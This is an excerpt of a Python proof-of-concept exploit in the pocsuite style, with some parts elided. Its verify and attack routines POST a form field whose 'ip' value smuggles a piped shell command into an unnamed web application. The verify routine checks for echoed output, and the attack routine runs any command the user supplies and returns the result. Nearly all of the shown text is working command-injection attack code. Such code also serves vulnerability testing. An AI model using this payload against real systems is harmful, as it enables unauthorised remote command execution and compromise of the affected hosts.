...
class POC(POCBase):
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        ...
        url = self.url + path
        data='jsondata[ip]=%7Cecho 123456789&jsondata[type]=0'
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            if resq and resq.status_code == 200 and "123456789" in resq.text:
    ...
    def _attack(self):
        ...
        data=f'jsondata[ip]=%7C{Command}&jsondata[type]=0'
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            t = resq.text
            t = t.replace('\n', '').replace('\r', '')
